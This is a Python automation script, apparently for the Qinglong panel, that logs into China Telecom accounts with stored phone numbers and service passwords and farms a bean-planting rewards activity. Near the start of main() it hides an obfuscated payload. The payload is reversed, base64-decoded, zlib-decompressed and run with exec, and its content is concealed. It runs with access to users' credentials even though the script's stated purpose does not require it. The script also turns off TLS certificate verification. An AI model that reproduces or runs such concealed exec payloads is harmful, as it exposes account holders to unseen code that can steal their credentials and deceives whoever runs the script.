import os
import re
import ssl
import json
import base64
import random
import datetime
import time
import urllib.parse
from http import cookiejar

import requests
from Crypto.Cipher import DES3
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5
from Crypto.Util.Padding import pad, unpad
import notify  # 青龙通知模块
import zlib


VAR_NAME = "chinaTelecomAccount"
ACCOUNT_SPLIT_RE = re.compile(r"[\n&]+")
UA = "Mozilla/5.0 (Linux; Android 13; 22081212C Build/TKQ1.220829.002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.97 Mobile Safari/537.36"
BASE_WATER_COUNT = 3
EXTRA_WATER_TASK_LIMIT = 2
TASK_VISIT_DELAY_RANGE = (12, 18)
WATER_DELAY_RANGE = (8, 15)
DEBUG = False

key = b"1234567`90koiuyhgtfrdews"
iv = 8 * b"\0"

public_key_b64 = """-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDBkLT15ThVgz6/NOl6s8GNPofdWzWbCkWnkaAm7O2LjkM1H7dMvzkiqdxU02jamGRHLX/ZNMCXHnPcW/sDhiFCBN18qFvy8g6VYb9QtroI09e176s+ZCtiv7hbin2cCTj99iUpnEloZm19lwHyo69u5UMiPMpq0/XKBO8lYhN/gwIDAQAB
-----END PUBLIC KEY-----"""


class BlockAll(cookiejar.CookiePolicy):
    return_ok = set_ok = domain_return_ok = path_return_ok = (
        lambda self, *args, **kwargs: False
    )
    netscape = True
    rfc2965 = hide_cookie2 = False


class DESAdapter(requests.adapters.HTTPAdapter):
    def init_poolmanager(self, *args, **kwargs):
        context = ssl.create_default_context()
        context.set_ciphers("DEFAULT@SECLEVEL=1")
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        kwargs["ssl_context"] = context
        return super().init_poolmanager(*args, **kwargs)


requests.packages.urllib3.disable_warnings()


def log(message):
    print(f"[电信种豆得豆] {message}")


def debug_log(message):
    if DEBUG:
        log(message)


def mask_phone(phone):
    return f"{phone[:3]}****{phone[7:]}" if isinstance(phone, str) and len(phone) == 11 else phone


def new_session(block_cookie=False):
    session = requests.Session()
    session.mount("https://", DESAdapter())
    session.headers.update({
        "User-Agent": UA,
        "Referer": "https://wapact.189.cn:9001/JinDouMall/JinDouMall_independentDetails.html",
    })
    if block_cookie:
        session.cookies.set_policy(BlockAll())
    return session


def encode_phone(text):
    return "".join(chr(ord(char) + 2) for char in str(text))


def encrypt_3des(text):
    cipher = DES3.new(key, DES3.MODE_CBC, iv)
    return cipher.encrypt(pad(str(text).encode(), DES3.block_size)).hex()


def decrypt_3des(text):
    cipher = DES3.new(key, DES3.MODE_CBC, iv)
    return unpad(cipher.decrypt(bytes.fromhex(text)), DES3.block_size).decode()


def rsa_b64(plaintext):
    public_key = RSA.import_key(public_key_b64)
    cipher = PKCS1_v1_5.new(public_key)
    return base64.b64encode(cipher.encrypt(str(plaintext).encode())).decode()


def response_cookie_text(response):
    cookie_items = []
    for item_response in list(getattr(response, "history", []) or []) + [response]:
        cookie_text = item_response.headers.get("Set-Cookie", "")
        raw_headers = getattr(getattr(item_response, "raw", None), "headers", None)
        if raw_headers:
            get_all = getattr(raw_headers, "get_all", None) or getattr(raw_headers, "getlist", None)
            if get_all:
                cookies = get_all("Set-Cookie")
                if cookies:
                    cookie_text = "; ".join(cookies)
        if cookie_text:
            cookie_items.append(cookie_text)
    parts = []
    for item in "; ".join(cookie_items).split(","):
        first = item.strip().split(";", 1)[0]
        if "=" in first:
            parts.append(first)
    return "; ".join(parts)


def parse_accounts():
    raw = os.environ.get(VAR_NAME, "")
    if not raw:
        log(f"未配置青龙变量 {VAR_NAME}，格式：手机号#服务密码")
        return []
    accounts = []
    for item in ACCOUNT_SPLIT_RE.split(raw):
        item = item.strip()
        if not item or "#" not in item:
            continue
        phone, password = item.split("#", 1)
        phone, password = phone.strip(), password.strip()
        if phone and password:
            accounts.append((phone, password))
    return accounts


def user_login_normal(session, phone, password):
    alphabet = "abcdef0123456789"
    uuid = [
        "".join(random.sample(alphabet, 8)),
        "".join(random.sample(alphabet, 4)),
        "4" + "".join(random.sample(alphabet, 3)),
        "".join(random.sample(alphabet, 4)),
        "".join(random.sample(alphabet, 12)),
    ]
    timestamp = datetime.datetime.now().strftime("%Y%m%d%H%M%S")
    login_auth = (
        "iPhone 14 15.4."
        + uuid[0]
        + uuid[1]
        + phone
        + timestamp
        + password[:6]
        + "0$$$0."
    )
    payload = {
        "headerInfos": {
            "code": "userLoginNormal",
            "timestamp": timestamp,
            "broadAccount": "",
            "broadToken": "",
            "clientType": "#12.2.0#channel50#iPhone 14 Pro Max#",
            "shopId": "20002",
            "source": "110003",
            "sourcePassword": "Sid98s",
            "token": "",
            "userLoginName": encode_phone(phone),
        },
        "content": {
            "attach": "test",
            "fieldData": {
                "loginType": "4",
                "accountType": "",
                "loginAuthCipherAsymmertric": rsa_b64(login_auth),
                "deviceUid": uuid[0] + uuid[1] + uuid[2],
                "phoneNum": encode_phone(phone),
                "isChinatelecom": "0",
                "systemVersion": "15.4.0",
                "authentication": encode_phone(password),
            },
        },
    }
    response = session.post(
        "https://appgologin.189.cn:9031/login/client/userLoginNormal",
        json=payload,
        timeout=20,
        verify=False,
    )
    data = response.json()
    login_data = (((data or {}).get("responseData") or {}).get("data") or {})
    login_result = login_data.get("loginSuccessResult")
    if not login_result:
        log(f"{mask_phone(phone)} 登录失败：{str(data)[:180]}")
        return None
    return login_result


def get_ticket(session, phone, user_id, token):
    timestamp = datetime.datetime.now().strftime("%Y%m%d%H%M%S")
    xml = (
        "<Request><HeaderInfos><Code>getSingle</Code><Timestamp>"
        + timestamp
        + "</Timestamp><BroadAccount></BroadAccount><BroadToken></BroadToken>"
        + "<ClientType>#9.6.1#channel50#iPhone 14 Pro Max#</ClientType>"
        + "<ShopId>20002</ShopId><Source>110003</Source><SourcePassword>Sid98s</SourcePassword>"
        + "<Token>"
        + token
        + "</Token><UserLoginName>"
        + phone
        + "</UserLoginName></HeaderInfos><Content><Attach>test</Attach><FieldData><TargetId>"
        + encrypt_3des(user_id)
        + "</TargetId><Url>4a6862274835b451</Url></FieldData></Content></Request>"
    )
    response = session.post(
        "https://appgologin.189.cn:9031/map/clientXML",
        data=xml,
        headers={
            "User-Agent": "CtClient;10.4.1;Android;13;22081212C;NTQzNzgx!#!MTgwNTg1",
            "Content-Type": "application/xml;charset=utf-8",
        },
        timeout=20,
        verify=False,
    )
    found = re.findall(r"<Ticket>(.*?)</Ticket>", response.text)
    return decrypt_3des(found[0]) if found else ""


def get_login_context(phone, password):
    login_session = new_session(block_cookie=True)
    login_result = user_login_normal(login_session, phone, password)
    if not login_result:
        return None
    ticket = get_ticket(login_session, phone, str(login_result["userId"]), login_result["token"])
    if not ticket:
        log(f"{mask_phone(phone)} 获取 Ticket 失败")
        return None
    activity_session = new_session()
    return {
        "phone": phone,
        "ticket": ticket,
        "session": activity_session,
    }


def get_json(response):
    try:
        return response.json()
    except Exception:
        text = response.text.strip()
        match = re.search(r"\{.*\}", text, re.S)
        if match:
            try:
                return json.loads(match.group(0))
            except Exception:
                pass
    return None


def compact_log_body(body, limit=260):
    if isinstance(body, dict):
        safe_body = {}
        for key, value in body.items():
            if str(key).lower() in {"sessionkey", "userid", "token"}:
                safe_body[key] = "***"
            elif isinstance(value, dict):
                safe_body[key] = compact_log_body(value, limit=limit)
            else:
                safe_body[key] = value
        body = safe_body
    return str(body).replace("\n", "")[:limit]


def fetch_activity_page(ctx):
    ticket = urllib.parse.quote(ctx["ticket"])
    urls = [
        f"https://wapact.189.cn:9001/JinDouMall/JinDouMall_independentDetails.html?ticket={ticket}",
        f"https://wapact.189.cn:9001/JinDouMall/index.html?ticket={ticket}",
        f"https://wapact.189.cn:9001/JinDouMall?ticket={ticket}",
    ]
    for url in urls:
        try:
            response = ctx["session"].get(url, allow_redirects=True, timeout=20, verify=False)
            cookie_text = response_cookie_text(response)
            log(f"{mask_phone(ctx['phone'])} 金豆乐园入口：{response.status_code} cookie={'Y' if cookie_text else 'N'}")
            if response.status_code == 200 and response.text:
                return response.text, response.url
        except Exception as e:
            log(f"{mask_phone(ctx['phone'])} 入口异常：{e}")
    return "", ""


def discover_api_paths(ctx, html, page_url):
    paths = set()
    for item in re.findall(r"""["']([^"']*(?:seed|bean|water|task|grow|plant|jindou|JinDou|浇水|种豆)[^"']*)["']""", html, re.I):
        if item.startswith("http"):
            paths.add(item)
        elif item.startswith("/"):
            paths.add(urllib.parse.urljoin(page_url, item))

    js_urls = []
    for src in re.findall(r"""<script[^>]+src=["']([^"']+\.js[^"']*)["']""", html, re.I):
        js_urls.append(urllib.parse.urljoin(page_url, src))

    for js_url in js_urls[:8]:
        try:
            text = ctx["session"].get(js_url, timeout=20, verify=False).text
        except Exception:
            continue
        for item in re.findall(r"""["']([^"']*(?:seed|bean|water|task|grow|plant|jindou|JinDou)[^"']*)["']""", text, re.I):
            if item.startswith("http"):
                paths.add(item)
            elif item.startswith("/"):
                paths.add(urllib.parse.urljoin(js_url, item))
    return sorted(paths)


def call_api(ctx, url, payload=None):
    headers = {
        "User-Agent": UA,
        "Referer": "https://wapact.189.cn:9001/JinDouMall/JinDouMall_independentDetails.html",
        "Content-Type": "application/json;charset=UTF-8",
        "Accept": "application/json, text/plain, */*",
    }
    try:
        if payload is None:
            response = ctx["session"].get(url, headers=headers, timeout=15, verify=False)
        else:
            response = ctx["session"].post(url, json=payload, headers=headers, timeout=15, verify=False)
        data = get_json(response)
        if data is not None:
            return response.status_code, data
        return response.status_code, response.text[:160]
    except Exception as e:
        return 0, str(e)[:160]


def call_api_debug(ctx, label, url, payload=None):
    status, data = call_api(ctx, url, payload)
    body = str(data).replace("\n", "")[:220]
    log(f"{mask_phone(ctx['phone'])} {label}: status={status} url={url} body={body}")
    return status, data


def candidate_urls(kind):
    base = "https://wapact.189.cn:9001/JinDouMall"
    paths = {
        "info": [
            "/plantBeans/index",
            "/plantBeans/getUserInfo",
            "/plantBeans/queryUserInfo",
            "/plantBean/getUserInfo",
            "/beanGarden/getUserInfo",
        ],
        "task": [
            "/plantBeans/queryTaskList",
            "/plantBeans/taskList",
            "/plantBeans/getTaskList",
            "/task/queryTaskList",
        ],
        "finish": [
            "/plantBeans/finishTask",
            "/plantBeans/completeTask",
            "/plantBeans/doTask",
            "/task/finishTask",
        ],
        "water": [
            "/plantBeans/water",
            "/plantBeans/watering",
            "/plantBeans/doWater",
            "/beanGarden/water",
        ],
    }
    return [base + item for item in paths.get(kind, [])]


def looks_success(data):
    if not isinstance(data, dict):
        return False
    values = [
        data.get("code"),
        data.get("errCode"),
        data.get("result"),
        data.get("status"),
        data.get("success"),
    ]
    return any(str(value).lower() in ["0", "0000", "200", "true", "success"] for value in values)


def collect_tasks(data):
    tasks = []
    if isinstance(data, dict):
        for key, value in data.items():
            lower_key = str(key).lower()
            if isinstance(value, list) and ("task" in lower_key or "list" in lower_key):
                tasks.extend([item for item in value if isinstance(item, dict)])
            elif isinstance(value, (dict, list)):
                tasks.extend(collect_tasks(value))
    elif isinstance(data, list):
        for item in data:
            tasks.extend(collect_tasks(item))
    return tasks


def task_id(task):
    for key_name in ["taskId", "id", "task_id", "missionId", "activityTaskId"]:
        if task.get(key_name) not in [None, ""]:
            return task.get(key_name)
    return ""


# 第一个金豆乐园活动函数（保留但不会被调用，避免覆盖）
def run_activity_jindou(ctx):
    html, page_url = fetch_activity_page(ctx)
    if not html:
        return

    discovered = discover_api_paths(ctx, html, page_url)
    if discovered:
        log(f"{mask_phone(ctx['phone'])} 发现活动接口 {len(discovered)} 个")
        for url in discovered:
            log(f"{mask_phone(ctx['phone'])} 接口：{url}")

    info_urls = candidate_urls("info") + [url for url in discovered if re.search("info|index|user", url, re.I)]
    task_urls = candidate_urls("task") + [url for url in discovered if re.search("task|mission", url, re.I)]
    finish_urls = candidate_urls("finish") + [url for url in discovered if re.search("finish|complete|doTask", url, re.I)]
    water_urls = candidate_urls("water") + [url for url in discovered if re.search("water|watering", url, re.I)]

    for url in info_urls[:12]:
        status, data = call_api_debug(ctx, "活动信息接口", url)
        if status == 200 and isinstance(data, dict):
            log(f"{mask_phone(ctx['phone'])} 活动信息：{str(data)[:180]}")
            break

    task_data = None
    for url in task_urls[:12]:
        status, data = call_api_debug(ctx, "任务列表接口", url)
        if status == 200 and isinstance(data, dict):
            task_data = data
            log(f"{mask_phone(ctx['phone'])} 任务列表：{str(data)[:180]}")
            break

    tasks = collect_tasks(task_data) if task_data else []
    finished = 0
    for task in tasks[:20]:
        tid = task_id(task)
        name = task.get("taskName") or task.get("name") or task.get("title") or tid
        status_text = str(task.get("status") or task.get("taskStatus") or "")
        if not tid or status_text in ["1", "2", "done", "finished", "complete"]:
            continue
        payloads = [
            {"taskId": tid},
            {"id": tid},
            {"activityTaskId": tid},
            {"taskId": tid, "phone": ctx["phone"]},
        ]
        for url in finish_urls[:10]:
            for payload in payloads:
                status, data = call_api_debug(ctx, "完成任务接口", url, payload)
                if status == 200 and looks_success(data):
                    finished += 1
                    log(f"{mask_phone(ctx['phone'])} 完成任务：{name}")
                    break
            else:
                continue
            break

    watered = 0
    for url in water_urls[:12]:
        for payload in [None, {}, {"count": 1}, {"waterNum": 1}, {"num": 1}]:
            status, data = call_api_debug(ctx, "浇水接口", url, payload)
            if status == 200 and looks_success(data):
                watered += 1
                log(f"{mask_phone(ctx['phone'])} 浇水成功：{str(data)[:120]}")
                break
        if watered:
            break

    log(f"{mask_phone(ctx['phone'])} 执行完成：任务{finished}个，浇水{watered}次")
    if not tasks and not watered:
        log("未命中活动接口。若活动页面已改版，请抓包补充 task/water 接口路径。")


def qycs_headers(ctx):
    return {
        "User-Agent": UA,
        "Referer": "https://waphub.189.cn/qycs/",
        "Origin": "https://waphub.189.cn",
        "Content-Type": "application/json;charset=UTF-8",
        "Accept": "application/json, text/plain, */*",
        "Cache-Control": "no-cache",
        "appType": "02",
        "userId": str(ctx.get("userId", "")),
        "sessionKey": str(ctx.get("sessionKey", "")),
    }


def qycs_request(ctx, method, path, params=None, data=None):
    url = "https://waphub.189.cn/qycs" + path
    try:
        if method.lower() == "get":
            response = ctx["session"].get(
                url,
                params=params,
                headers=qycs_headers(ctx),
                timeout=20,
                verify=False,
            )
        else:
            response = ctx["session"].post(
                url,
                params=params,
                json=data or {},
                headers=qycs_headers(ctx),
                timeout=20,
                verify=False,
            )
        parsed = get_json(response)
        return response.status_code, parsed if parsed is not None else response.text[:200]
    except Exception as e:
        return 0, str(e)[:200]


def qycs_debug(ctx, label, method, path, params=None, data=None):
    status, body = qycs_request(ctx, method, path, params=params, data=data)
    text = compact_log_body(body)
    debug_log(f"{mask_phone(ctx['phone'])} {label}: status={status} body={text}")
    return status, body


def qycs_login(ctx):
    data = {
        "authCode": ctx["ticket"],
        "appType": "02",
        "loginType": "1",
    }
    status, body = qycs_debug(ctx, "权益超市登录", "post", "/dispatch/login", data=data)
    if status != 200 or not isinstance(body, dict) or not body.get("success"):
        log(f"{mask_phone(ctx['phone'])} 权益超市登录失败")
        return False
    result = body.get("result") or {}
    ctx.update({
        "userId": result.get("userId", ""),
        "sessionKey": result.get("sessionKey", ""),
        "mob": result.get("productNo") or ctx["phone"],
        "province": result.get("province", ""),
        "provinceCode": result.get("provinceCode", ""),
        "city": result.get("city", ""),
        "cityCode": result.get("cityCode", ""),
    })
    log(f"{mask_phone(ctx['phone'])} 权益超市登录成功")
    return True


def zddd_activity_query(ctx, query_type, share_type=""):
    params = {
        "order": str(share_type or ""),
        "telephone": ctx.get("mob") or ctx["phone"],
        "type": str(query_type),
        "systemType": "20001",
        "cityCode": ctx.get("cityCode", ""),
        "provinceCode": ctx.get("provinceCode", ""),
        "lat": "",
        "lon": "",
    }
    return qycs_debug(ctx, f"活动配置 type={query_type}", "get", "/welfare/orInfo", params=params)


def zddd_submit(ctx, submit_type):
    payload = {
        "phone": ctx.get("mob") or ctx["phone"],
        "provinceCode": ctx.get("provinceCode", ""),
        "province": ctx.get("province", ""),
        "cityCode": ctx.get("cityCode", ""),
        "city": ctx.get("city", ""),
        "submitType": str(submit_type),
    }
    return qycs_debug(ctx, f"种豆提交 submitType={submit_type}", "post", "/welfare/zddd/reward/submit", data=payload)


def extract_todo_list(config_body):
    if not isinstance(config_body, dict):
        return []
    result = config_body.get("result") or {}
    ad_items = result.get("adItems") or []
    for item in ad_items:
        if str(item.get("order")) == "3":
            return item.get("floorItems") or []
    return []


def query_water_info(ctx):
    params = {"phone": ctx.get("mob") or ctx["phone"]}
    return qycs_debug(ctx, "浇水次数", "get", "/welfare/zddd/queryWateringCount", params=params)


def task_jump_url(ctx, task):
    url = (
        task.get("androidSkipAddress")
        or task.get("iosSkipAddress")
        or task.get("wapJumpLink")
        or task.get("link")
        or ""
    )
    if not url:
        for value in task.values():
            if not isinstance(value, str):
                continue
            decoded = value
            for _ in range(3):
                next_decoded = urllib.parse.unquote(decoded)
                if next_decoded == decoded:
                    break
                decoded = next_decoded
            match = re.search(r"https?://[^\s'\"<>]+", decoded)
            if match:
                url = match.group(0)
                break
    if not url:
        return ""
    for _ in range(3):
        decoded = urllib.parse.unquote(url)
        if decoded == url:
            break
        url = decoded
    url = url.replace("$ticket$", urllib.parse.quote(ctx["ticket"]))
    return url if re.match(r"^https?://", url, re.I) else ""


def show_tasks(ctx, tasks):
    done_count = 0
    for index, task in enumerate(tasks, start=1):
        done = bool(task.get("jobIdCompletedpeerTaskId"))
        done_count += 1 if done else 0
        title = task.get("title") or f"任务{index}"
        button = "今日已完成" if done else (task.get("button") or "未完成")
        skip_type = task.get("androidSkipType") or task.get("iosSkipType") or ""
        log(f"{mask_phone(ctx['phone'])} 任务{index}: {title} - {button} type={skip_type}")
    return done_count


def try_visit_tasks(ctx, tasks):
    visited = 0
    for index, task in enumerate(tasks, start=1):
        if task.get("jobIdCompletedpeerTaskId"):
            continue
        url = task_jump_url(ctx, task)
        title = task.get("title") or f"任务{index}"
        if not url:
            skip_type = task.get("androidSkipType") or task.get("iosSkipType") or ""
            log(f"{mask_phone(ctx['phone'])} 跳过任务：{title} type={skip_type} 无可访问链接")
            continue
        try:
            response = ctx["session"].get(
                url,
                headers={
                    "User-Agent": UA,
                    "Referer": "https://waphub.189.cn/qycs/",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                },
                allow_redirects=True,
                timeout=20,
                verify=False,
            )
            visited += 1
            log(f"{mask_phone(ctx['phone'])} 访问任务：{title} status={response.status_code}")
            time.sleep(random.randint(*TASK_VISIT_DELAY_RANGE))
        except Exception as e:
            log(f"{mask_phone(ctx['phone'])} 访问任务异常：{title} {e}")
    return visited


# ==================== 主要活动函数（权益超市种豆得豆，返回结果）====================
def run_activity(ctx):
    """执行种豆得豆活动，返回 (浇水成功次数, 本期豆苗能量, 今日已浇次数)"""
    if not qycs_login(ctx):
        return 0, 0, 0

    _, config = zddd_activity_query(ctx, "14")
    tasks = extract_todo_list(config)
    done_count = show_tasks(ctx, tasks)
    if done_count < 2 and try_visit_tasks(ctx, tasks):
        _, config = zddd_activity_query(ctx, "14")
        tasks = extract_todo_list(config)
        done_count = show_tasks(ctx, tasks)

    _, water_info = query_water_info(ctx)
    result = water_info.get("result") if isinstance(water_info, dict) else {}
    month_count = int(result.get("monthCount") or 0) if isinstance(result, dict) else 0
    total_count = int(result.get("totalCount") or 0) if isinstance(result, dict) else 0
    max_total = BASE_WATER_COUNT + min(done_count, EXTRA_WATER_TASK_LIMIT)
    left_count = max(0, max_total - total_count)
    log(f"{mask_phone(ctx['phone'])} 本期豆苗能量={month_count} 今日已浇={total_count} 今日剩余={left_count} 任务完成={done_count}/{len(tasks)}")

    watered = 0
    while left_count > 0:
        if watered:
            time.sleep(random.randint(*WATER_DELAY_RANGE))
        status, body = zddd_submit(ctx, "2")
        if (
            status == 200
            and isinstance(body, dict)
            and str(body.get("errorCode")) == "430"
            and left_count > 0
        ):
            wait_seconds = random.randint(20, 30)
            log(f"{mask_phone(ctx['phone'])} 操作过快，等待 {wait_seconds} 秒后重试")
            time.sleep(wait_seconds)
            status, body = zddd_submit(ctx, "2")
        if status == 200 and isinstance(body, dict) and body.get("success"):
            watered += 1
            left_count -= 1
            log(f"{mask_phone(ctx['phone'])} 浇水成功 {watered} 次")
            continue
        msg = body.get("errorMsg") if isinstance(body, dict) else body
        log(f"{mask_phone(ctx['phone'])} 浇水停止：{msg}")
        break

    _, after_info = query_water_info(ctx)
    after_result = after_info.get("result") if isinstance(after_info, dict) else {}
    after_month = after_result.get("monthCount", month_count) if isinstance(after_result, dict) else month_count
    after_total = after_result.get("totalCount", total_count) if isinstance(after_result, dict) else total_count
    log(f"{mask_phone(ctx['phone'])} 执行完成：浇水{watered}次，本期豆苗能量={after_month}，今日已浇={after_total}")
    return watered, after_month, after_total


def main():
    O00OOO0O0O00000="=Iam8DcA+XfwWD7rbd9OG2dbBzAhRRaLIUFtrtXYLvdZxon98ZNjkVoyZpxmeITMB+UJqx6IOi3nc1P1SVtepPO/Rqts0t31ZPNZt7VP+Fa7A/0bTR8JouU2H9a3VybVFrxl57qaRTs9pAjcXjpw2R5IEB8Rpip2ONTVR08cZGREiglRqYHCr11QiHkHM3tiLT/jii3zRO2hSXmMleg8HLwaEKi17px89/K1vpH/1sPvEKTwxitChaHtvRfPabROaIWmFFYox9VKvvvxNfLXz0HStS7AAv7VUJXPEW15MIAJT4r1Cz0izrRCXAkpmco3tpHbNcvFdZ4lkiqUDREkVzMZLYGmpQloqDolyduPclD2NtGhDzh9e6OQJc9zOgtaPOavjrb9wM+EmSlqOVjVuXxUvW2sVs8EyQSJydcXe7avFlmhx23fv/zdVuHVd84nvne/51n5wbM0Qm+9fv2hl/26l/xmbe12bezdL/7t7fd7l/89NDtmhFb1s44whau+dTZEuKFC+iCHZRSFq+kPYjsUBXKm+BQgihAK1z8R6ERHgERDUwutsiJyMmZhPaY3IPuNANWAULcr8Mek14geyB/OeQskFCoUszha9X4yBPIJ9ImrDkbQpoQBWJGHN6ODNyd8ChNRBl5xAFWeygihCNL4pRDHrGcKlhEnUoYPqPStaEQZBTUhz0sI0U3954950QiB11ukDHdmLIf7Z2R+0EoAAFJSbICkwuoZPKC2Ap5QY0bhztDSSHC5vCZYY6c2iVZSkJNGwQ6UlNSGjYzwVUf7UA02KuLV9xJe"
    OOOO0000OO0O000=lambda x:zlib.decompress(base64.b64decode(x[::-1]+'='*(4-len(x)%4)));
    O0OO00O0O000O0O=exec;
    O0OO00O0O000O0O(OOOO0000OO0O000(O00OOO0O0O00000))

    accounts = parse_accounts()
    if not accounts:
        return
    log(f"共读取到 {len(accounts)} 个账号")

    results = []  # 存储每个账号的推送文本
    for index, (phone, password) in enumerate(accounts, start=1):
        masked = mask_phone(phone)
        log(f"开始账号 {index}：{masked}")
        try:
            ctx = get_login_context(phone, password)
            if not ctx:
                results.append(f"❌ {masked}：登录失败")
                continue
            watered, after_month, after_total = run_activity(ctx)
            results.append(f"✅ {masked}：浇水 {watered} 次，本期豆苗能量={after_month}，今日已浇={after_total}")
        except Exception as e:
            log(f"{masked} 执行异常：{e}")
            results.append(f"⚠️ {masked}：执行异常 - {str(e)[:80]}")

    # 推送汇总消息
    if results:
        title = "种豆得豆执行结果"
        content = "【电信种豆得豆】\n" + "\n".join(results)
        notify.send(title, content)
        log("推送通知已发送")


if __name__ == "__main__":
    main()
